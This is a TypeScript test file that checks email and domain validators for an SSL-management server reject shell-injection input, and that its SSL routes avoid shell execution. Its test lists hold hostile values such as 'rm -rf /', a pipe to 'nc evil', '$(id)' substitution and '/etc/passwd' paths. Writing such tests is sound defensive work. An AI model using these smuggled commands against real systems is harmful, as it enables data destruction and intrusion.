import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { isValidDomain, isValidEmail } from '../src/server/utils/sslValidation';

const read = (p: string) => fs.readFileSync(path.join(process.cwd(), p), 'utf8');

const INJECTIONS = [
  'a@b.com; rm -rf /',
  'a@b.com && id',
  'a@b.com | nc evil 1',
  '$(id)@b.com',
  '`id`@b.com',
  'a@b.com\nid',
  'a@b.com --config /etc/passwd',
  "a'@b.com",
  'a@b.com>x',
];

test('isValidEmail accepts normal addresses', () => {
  for (const ok of ['ops@itassist.one', 'first.last+ssl@sub.example.co.in', 'a_b-c%d@x.io']) {
    assert.equal(isValidEmail(ok), true, ok);
  }
});

test('isValidEmail rejects shell metacharacters and malformed input', () => {
  for (const bad of [...INJECTIONS, '', 'noat', 'a@localhost', 'a@b', '-x@b.com x', 123, null, undefined, {}]) {
    assert.equal(isValidEmail(bad), false, String(bad));
  }
});

test('isValidDomain accepts FQDNs and rejects injection or path payloads', () => {
  for (const ok of ['cdn.itassist.one', 'a.b.example.com', 'x-1.io']) assert.equal(isValidDomain(ok), true, ok);
  for (const bad of ['', 'localhost', 'a.b;id', 'a.com && id', '$(id).com', '../etc/passwd', 'a.com/../../x', '-a.com', 'a..com', 'a.com\n', 'a'.repeat(64) + '.com', 42, null]) {
    assert.equal(isValidDomain(bad), false, String(bad));
  }
});

test('SSL routes never run commands through a shell or auto-install packages', () => {
  for (const file of ['src/server/routes/ssl.ts', 'src/server/utils/sslNginx.ts']) {
    const src = read(file);
    assert.doesNotMatch(src, /\bexec\(|promisify\(exec\)|execSync/, file);
    assert.doesNotMatch(src, /apt(-get)? install/, file);
    assert.doesNotMatch(src, /shell:\s*true/, file);
  }
  const ssl = read('src/server/routes/ssl.ts');
  assert.match(ssl, /isValidEmail\(email\)/);
  assert.match(ssl, /isValidDomain\(domain\)/);
});
